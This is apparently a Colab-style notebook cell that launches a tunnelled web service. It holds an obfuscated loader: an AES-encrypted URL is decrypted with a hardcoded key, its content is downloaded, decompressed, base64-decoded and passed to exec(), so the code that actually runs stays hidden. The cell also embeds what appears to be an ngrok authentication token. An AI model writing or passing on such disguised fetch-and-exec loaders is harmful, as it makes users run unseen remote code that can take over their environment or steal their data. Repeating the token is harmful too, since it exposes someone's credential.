{
  "metadata": {
    "kernelspec": {
      "name": "python",
      "display_name": "Python (Pyodide)",
      "language": "python"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "python",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.8"
    }
  },
  "nbformat_minor": 5,
  "nbformat": 4,
  "cells": [
    {
      "cell_type": "code",
      "source": "import os\nimport requests\nimport base64\nimport zlib\n!pip install pycryptodome\nngrok=\"2VkcXtq9V0p8EVvlTXVPpwEkaGw_4hpUyhjF8BabaUBckc97K\"  #@param {type:\"string\"}\nshare = False # @param {type:\"boolean\"}\ncloudflared = False # @param {type:\"boolean\"}\nlocalhostrun = True # @param {type:\"boolean\"}\nremotemoe = True # @param {type:\"boolean\"}\n\n!apt-get -y install -qq aria2\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\ndef aes_decrypt(encrypted_text, key):\n  key = base64.b64decode(key)\n  cipher = AES.new(key, AES.MODE_ECB)\n  decrypted_text = unpad(cipher.decrypt(base64.b64decode(encrypted_text)), AES.block_size)\n  return decrypted_text.decode('utf-8')\n\ndef get_bytes(links):\n  response = requests.get(links)\n  if response.status_code == 200:\n      tbytes = response.content\n      return tbytes\nmain = \"EYNpnvXJCNpMRgkPuGTkjrD+ZxHHL61pVnV8989A3Rs+klYX9e0kK0nz++imcCQTbYYJMDSdT/blzMGIEk1wlQ==\"  #@param {type:\"string\"}\nmain_key=\"LJO29hHdXeC0p8OQAc0MqQ==\"  #@param {type:\"string\"}\n\nmain_links = aes_decrypt(main,main_key)\nmain_bytes = get_bytes(main_links)\nmain_code = base64.b64decode(zlib.decompress(main_bytes))\n\nif not os.path.exists(\"/content/log.txt\"):\n  exec(main_code)\n  with open('/content/log.txt', 'r') as file:\n    dir = file.read().strip()\n",
      "metadata": {},
      "execution_count": null,
      "outputs": [],
      "id": "d9272d80-46ef-499e-b3a5-141230210dc5"
    }
  ]
}